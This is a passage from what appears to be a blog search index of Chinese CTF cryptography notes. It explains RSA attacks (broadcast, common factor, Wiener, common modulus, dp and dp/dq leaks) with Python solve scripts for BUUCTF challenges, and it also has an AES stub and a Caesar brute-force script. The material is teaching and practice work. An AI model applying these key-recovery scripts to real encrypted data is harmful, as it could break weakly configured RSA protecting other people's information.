int(&#x27;10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242&#x27;,5)<br><br>e = 3<br>n = [N1, N2, N3]<br>c = [c1, c2, c3]<br>resultant, mod = crt(n, c)<br>value, is_perfect = gmpy2.iroot(resultant, e)<br>print(long_to_bytes(value))<br></code></pre></td></tr></table></figure><h1 id="思路三、2）公因数攻击（多组n-c）"><a href="#思路三、2）公因数攻击（多组n-c）" class="headerlink" title="思路三、2）公因数攻击（多组n,c）"></a>思路三、2）公因数攻击（多组n,c）</h1><p>适用情况：很多组n和c</p><p>和上面的广播攻击类似，题目会给你很多组n和c。我们知道n&#x3D;p*q，而p、q是两个大素数。所以说当有很多组n的时候，很有可能出现两个n之间存在公因数。而这个公因数就是p和q其中的一个，当然知道其中一个另一个也就知道了，我们就可以求出d进而根据对应密文求出m。</p><h3 id="例题：BUUCTF-RSA5"><a href="#例题：BUUCTF-RSA5" class="headerlink" title="例题：BUUCTF RSA5"></a><font style="color:rgb(79, 79, 79);">例题：BUUCTF RSA5</font></h3><p><font style="color:rgb(77, 77, 77);">题目中e &#x3D; 65537，然后给了多达20组的n和c。</font></p><p><img src="/./img/49277317_PHKhbjfqdzX59Mip/1722240688415-1df63071-9436-4620-8776-3f47d40eb465-258723.png" alt="1722240688415-1df63071-9436-4620-8776-3f47d40eb465.png"></p><p><font style="color:rgb(77, 77, 77);">此时我们就可以尝试公因数攻击，对所有n进行两两对比看看有没有公因数，如果发现公因数就可以顺势解出明文，python脚本如下：</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span>  gmpy2<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br> <br>n1 = <span class="hljs-number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span><br>c1 = <span class="hljs-number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span><br> <br><span class="hljs-comment">#...此处省略20组n和c</span><br> <br>e = <span class="hljs-number">65537</span><br>n=[]<br>c=[]<br>p=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>):<br>n.append(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;n&#x27;</span>+<span class="hljs-built_in">str</span>(i)))<br>c.append(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-built_in">str</span>(i)))<br>data=<span class="hljs-built_in">list</span>(<span class="hljs-built_in">zip</span>(n,c))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)):<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i+<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(n)):<br><span class="hljs-keyword">if</span> gmpy2.gcd(n[i],n[j])!=<span class="hljs-number">1</span>:<br><span class="hljs-built_in">print</span>(i,j)<span class="hljs-comment">#i=4,j=17</span><br><span class="hljs-built_in">print</span>(gmpy2.gcd(n[i],n[j]))<br>p=gmpy2.gcd(n5,n18)<br>q=n5//p<br>d = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(d)<br>m = <span class="hljs-built_in">pow</span>(c5,d,n5)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h1 id="思路四、低解密指数攻击（e很大）"><a href="#思路四、低解密指数攻击（e很大）" class="headerlink" title="思路四、低解密指数攻击（e很大）"></a>思路四、低解密指数攻击（e很大）</h1><p>适用情况：e很大</p><p>和低加密指数攻击相反，当e很大的时候我们怎么办呢，这里就要用到低解密指数攻击。当e很大时，相对的d就会很小。这里我们用到github上一个wienerHacker脚本<a href="https://github.com/pablocelayes/rsa-wiener-attack">pablocelayes&#x2F;rsa-wiener-attack: A Python implementation of the Wiener attack on RSA public-key encryption scheme. (github.com)</a></p><p> 下载之后把里面RSAwienerHacker.py改一改输入题目给你的e和n就可以帮你解出d。</p><h3 id="例题：BUUCTF-RSA2"><a href="#例题：BUUCTF-RSA2" class="headerlink" title="例题：BUUCTF RSA2"></a><font style="color:rgb(79, 79, 79);">例题：BUUCTF RSA2</font></h3><p><font style="color:rgb(77, 77, 77);">题目给的e非常大，我们放到脚本里解出d：</font></p><p><img src="/./img/49277317_PHKhbjfqdzX59Mip/1722240843852-7aa201e3-f657-4100-95bc-34fd330ead86-184688.png" alt="1722240843852-7aa201e3-f657-4100-95bc-34fd330ead86.png"></p><p><img src="/./img/49277317_PHKhbjfqdzX59Mip/1722240859493-11f6d2e5-654b-40e0-963a-ac9a8d4757bc-094844.png" alt="1722240859493-11f6d2e5-654b-40e0-963a-ac9a8d4757bc.png"><font style="color:rgb(77, 77, 77);">有了d后续进行一些转换就很简单了，解密脚本如下：</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#低解密指数攻击，使用 RSAwienerHacker脚本解出d</span><br><span class="hljs-comment">#注意python2和python3在hex转换时数据结尾相差差一个L字符，会导致hash值不一样</span><br>N = <span class="hljs-number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span><br>e = <span class="hljs-number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span><br> <br>d = <span class="hljs-number">8920758995414587152829426558580025657357328745839747693739591820283538307445</span><br>dd = <span class="hljs-built_in">hex</span>(d)<br>dd = dd+<span class="hljs-string">&quot;L&quot;</span><br><span class="hljs-built_in">print</span>(dd)<br><span class="hljs-keyword">import</span> hashlib<br>flag = <span class="hljs-string">&quot;flag&#123;&quot;</span> + hashlib.md5(dd.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest() + <span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_PHKhbjfqdzX59Mip/1722240898598-63f41417-a2e6-47cf-851b-6e22757013be-884160.png" alt="1722240898598-63f41417-a2e6-47cf-851b-6e22757013be.png"></p><h1 id="思路五、共模攻击"><a href="#思路五、共模攻击" class="headerlink" title="思路五、共模攻击"></a>思路五、共模攻击</h1><p>适用情况，多组c,e但模数n相同，且e之间最好互质。</p><p>当题目给我们很多组c和e，但它们加密使用的模数n相同时，我们可以考虑共模攻击，当e1，e2互质，有gcd(e1,e2)&#x3D;1，根据扩展欧几里得算法，一定存在整数x,y使得e1<em>x+e2</em>y&#x3D;1。我们可以调用gmpy2.gcdext()来使用扩展欧几里得算法，以此求出x和y。</p><p>又根据加密过程，<img src="/./img/49277317_PHKhbjfqdzX59Mip/1722240936923-c82aea69-996f-4138-a17d-a128dacf0f9f-900214.gif" alt="1722240936923-c82aea69-996f-4138-a17d-a128dacf0f9f.gif">,。</p><p>所以(c1^s1*c2^s2)%n &#x3D; ((m^e1%n)^s1(m^e2%n)^s2)modn</p><p>又经过一堆化简之后就可以得到：m &#x3D; (c1^x*c2^y)modn,得到明文。</p><h3 id="例题：BUUCTF-BJDCTF2020-rsa-output"><a href="#例题：BUUCTF-BJDCTF2020-rsa-output" class="headerlink" title="例题：BUUCTF  [BJDCTF2020]rsa_output"></a><font style="color:rgb(79, 79, 79);">例题：BUUCTF  [BJDCTF2020]rsa_output</font></h3><p><font style="color:rgb(77, 77, 77);">题目给了c1,c2;e1,e2以及一个共同的n，尝试共模攻击，脚本如下。</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime,long_to_bytes<br> <br>e1 = <span class="hljs-number">2767</span><br>e2 = <span class="hljs-number">3659</span><br>n = <span class="hljs-number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span><br> <br>c1 = <span class="hljs-number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span><br>c2 = <span class="hljs-number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span><br> <br>_,s1, s2 = gmpy2.gcdext(e1, e2)<br>m = <span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n) % n<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_PHKhbjfqdzX59Mip/1722241015169-8980e411-8758-49c2-961a-4ad608f057d8-061018.png" alt="1722241015169-8980e411-8758-49c2-961a-4ad608f057d8.png"></p><h1 id="思路六、dp泄露"><a href="#思路六、dp泄露" class="headerlink" title="思路六、dp泄露"></a><font style="color:rgb(79, 79, 79);">思路六、dp泄露</font></h1><p><font style="color:rgb(77, 77, 77);">适用情况：题目提供dp\dq</font></p><p><font style="color:rgb(77, 77, 77);">有时候除了e,n,c之外题目还会给你像dp,dq这样的值，这是为了方便计算产生的，同时也给了我们另一种解题思路。首先，了解dp,dq是什么东西：</font></p><p><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">dp&#x3D;d%(p-1)</font></p><p><font style="color:rgb(77, 77, 77);">然后就可以进行推导，简单过程如下： </font></p><p><font style="color:rgb(77, 77, 77);">d &#x3D; dp + k1 * (p-1) </font></p><p><font style="color:rgb(77, 77, 77);">d * e &#x3D; 1 + k2(p-1)(q-1) </font></p><p><font style="color:rgb(77, 77, 77);">把第二个式子的d代换掉：</font></p><p><font style="color:rgb(77, 77, 77);">e * (dp + k1(p-1)) &#x3D; 1 + k2(p-1)(q-1)</font></p><p><font style="color:rgb(77, 77, 77);">两边同时对(p-1)取模，消去k</font></p><p><font style="color:rgb(77, 77, 77);">e * dp % (p - 1) &#x3D; 1</font></p><p><font style="color:rgb(77, 77, 77);">e * dp &#x3D; 1 + k(p - 1)</font></p><p><font style="color:rgb(77, 77, 77);">得到这个式子之后我们就可以通过爆破k的方式来求出p，进而求出d。</font></p><h3 id="例题：BUUCTF-RSA2-1"><a href="#例题：BUUCTF-RSA2-1" class="headerlink" title="例题：BUUCTF RSA2"></a><font style="color:rgb(79, 79, 79);">例题：BUUCTF RSA2</font></h3><p><font style="color:rgb(77, 77, 77);">题目提供了dp,e,n,c</font></p><p><img src="/./img/49277317_PHKhbjfqdzX59Mip/1722241144611-0b853a8f-def8-4e97-93df-8549875dd912-282785.png" alt="1722241144611-0b853a8f-def8-4e97-93df-8549875dd912.png"></p><p><font style="color:rgb(77, 77, 77);">python脚本如下：</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br> <br>e = <span class="hljs-number">65537</span><br>n = <span class="hljs-number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br>dp = <span class="hljs-number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br> <br>c = <span class="hljs-number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, e):<br>    <span class="hljs-keyword">if</span> (dp * e - <span class="hljs-number">1</span>) % i == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> n % (((dp * e - <span class="hljs-number">1</span>) // i) + <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>:<br>            p = ((dp * e - <span class="hljs-number">1</span>) // i) + <span class="hljs-number">1</span><br>            q = n // (((dp * e - <span class="hljs-number">1</span>) // i) + <span class="hljs-number">1</span>)<br>            d = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>            m = <span class="hljs-built_in">pow</span>(c, d, n)<br> <br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_PHKhbjfqdzX59Mip/1722241168046-33f80629-a3cb-43dc-b037-70ecac8412f1-786766.png" alt="1722241168046-33f80629-a3cb-43dc-b037-70ecac8412f1.png"></p><h1 id="思路七、dp-dq泄露"><a href="#思路七、dp-dq泄露" class="headerlink" title="思路七、dp,dq泄露"></a><font style="color:rgb(79, 79, 79);">思路七、dp,dq泄露</font></h1><p><font style="color:rgb(77, 77, 77);">适用情况：dp,dq同时泄露</font></p><p><font style="color:rgb(77, 77, 77);">有的时候题目把dpdq都给我们了，这个时候我们不用知道e也可以解密。</font></p><p><font style="color:rgb(77, 77, 77);">此时有：</font></p><p><font style="color:rgb(79, 79, 79);">m1 &#x3D; c^dpmodp</font></p><p><font style="color:rgb(79, 79, 79);">m2 &#x3D; c^dqmodq</font></p><p><font style="color:rgb(79, 79, 79);">m &#x3D; (((m1-m2)*I)%p)*q+m2</font></p><p><font style="color:rgb(79, 79, 79);">其中I为对pq求逆元</font></p><h3 id="例题：BUUCTF-RSA1"><a href="#例题：BUUCTF-RSA1" class="headerlink" title="例题：BUUCTF RSA1"></a><font style="color:rgb(79, 79, 79);">例题：BUUCTF RSA1</font></h3><p><font style="color:rgb(77, 77, 77);">题目给出p,q,dp,dq,c没有e。</font></p><font style="color:rgb(79, 79, 79);">  </font><font style="color:rgb(79, 79, 79);"> </font>![1722241245101-0b654a18-4436-4202-aaab-678e5402baff.png](./img/49277317_PHKhbjfqdzX59Mip/1722241245101-0b654a18-4436-4202-aaab-678e5402baff-725725.png)<p><font style="color:rgb(77, 77, 77);">此时可以用上述公式求解，python脚本如下：</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>p = <span class="hljs-number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span><br>q = <span class="hljs-number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span><br>dp = <span class="hljs-number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span><br>dq = <span class="hljs-number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span><br>c = <span class="hljs-number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br>I = gmpy2.invert(q,p)<br>m1 = <span class="hljs-built_in">pow</span>(c,dp,p)<br>m2 = <span class="hljs-built_in">pow</span>(c,dq,q)<br>m = (((m1-m2)*I)%p)*q+m2<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_PHKhbjfqdzX59Mip/1722241266185-2b4ab36c-1776-4eb6-8ab2-0dcb282fca3a-486541.png" alt="1722241266185-2b4ab36c-1776-4eb6-8ab2-0dcb282fca3a.png"></p><p><font style="color:rgb(77, 77, 77);"></font></p><blockquote><p>更新: 2024-07-31 10:44:19<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/fptr5c92n98m4y5d">https://www.yuque.com/chaye-apqbl/vsc85q/fptr5c92n98m4y5d</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/Crypto/%E7%8E%B0%E4%BB%A3%E5%8A%A0%E5%AF%86/index/"/>
    <url>/2026/01/19/Crypto/%E7%8E%B0%E4%BB%A3%E5%8A%A0%E5%AF%86/index/</url>
    
    <content type="html"><![CDATA[<h1 id="现代加密"><a href="#现代加密" class="headerlink" title="现代加密"></a>现代加密</h1><blockquote><p>更新: 2024-11-13 14:56:03<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ketcxbmpbzu9t7yo">https://www.yuque.com/chaye-apqbl/vsc85q/ketcxbmpbzu9t7yo</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/Crypto/%E7%8E%B0%E4%BB%A3%E5%8A%A0%E5%AF%86/AES%E5%8A%A0%E5%AF%86/"/>
    <url>/2026/01/19/Crypto/%E7%8E%B0%E4%BB%A3%E5%8A%A0%E5%AF%86/AES%E5%8A%A0%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h1><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h1 id="省赛测试赛"><a href="#省赛测试赛" class="headerlink" title="省赛测试赛"></a>省赛测试赛</h1><p>[“Kln&#x2F;qZwlOsux+b&#x2F;Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08。RUNCIDAgMTI4IHNpeCBudW1iZXJz”,”Kln&#x2F;qZwlOsux+b&#x2F;Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08”]</p><h1 id=""><a href="#" class="headerlink" title=""></a><img src="/./img/_V8JoOLVYa-HZfDw/1730267832978-d466c05e-dd7d-430e-ba48-c10a43f723e8-600776.png" alt="1730267832978-d466c05e-dd7d-430e-ba48-c10a43f723e8.png"></h1><blockquote><p>更新: 2024-10-30 14:07:55<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/bqe701nm19ry1vep">https://www.yuque.com/chaye-apqbl/vsc85q/bqe701nm19ry1vep</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/Crypto/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/%E5%87%AF%E6%92%92%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/"/>
    <url>/2026/01/19/Crypto/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/%E5%87%AF%E6%92%92%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="凯撒爆破脚本"><a href="#凯撒爆破脚本" class="headerlink" title="凯撒爆破脚本"></a>凯撒爆破脚本</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain">LETTERS=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;<br>LETTERS1=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;<br>LETTERS2=&quot;abcdefghijklmnopqrstuvwxyz&quot;<br><br>text=input(&quot;请输入密文：&quot;)<br>for key in range(len(LETTERS)):<br>    str=&quot;&quot;<br>    for i in text:<br>        if i in LETTERS:<br>            if i.isupper():  #密文字母为大写<br>                num = LETTERS1.find(i)  #在字母里搜索到密文字符的位置<br>                num = num - key<br>                if num&lt;0:<br>                    num = num + len(LETTERS1)<br>                str = str + LETTERS1[num]  #将解密后字符追加到字符串末尾<br>            elif i.islower():  #密文字母为小写<br>                num = LETTERS2.find(i)  #在字母里搜索到密文字符的位置<br>                num = num - key<br>                if num&lt;0:<br>                    num = num + len(LETTERS2)<br>                str = str + LETTERS2[num]  #将解密后字符追加到字符串末尾<br>        else:<br>            str = str + i  #如果密文中内容不在字母里则不解密，直接追加<br>    print(&#x27;第%d把钥匙的结果是%s&#x27; %(key, str))  #显示每一个可能的值<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2024-10-08 15:53:54<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/rb4kptqaufh3x1f0">https://www.yuque.com/chaye-apqbl/vsc85q/rb4kptqaufh3x1f0</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/Crypto/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/index/"/>
    <url>/2026/01/19/Crypto/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/index/</url>
    
    <content type="html"><![CDATA[<h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><h1 id="核心价值观解密"><a href="#核心价值观解密" class="headerlink" title="核心价值观解密"></a>核心价值观解密</h1><p><img src="/./img/49277317_ZDUEK559m2RUe-Zc/1722319565493-b970f65d-0e4d-45e6-9a6e-064691326630-355965.png" alt="1722319565493-b970f65d-0e4d-45e6-9a6e-064691326630.png"></p><blockquote><p>更新: 2024-07-30 14:06:08<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/il59apwez1g6s2gt">https://www.yuque.com/chaye-apqbl/vsc85q/il59apwez1g6s2gt</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
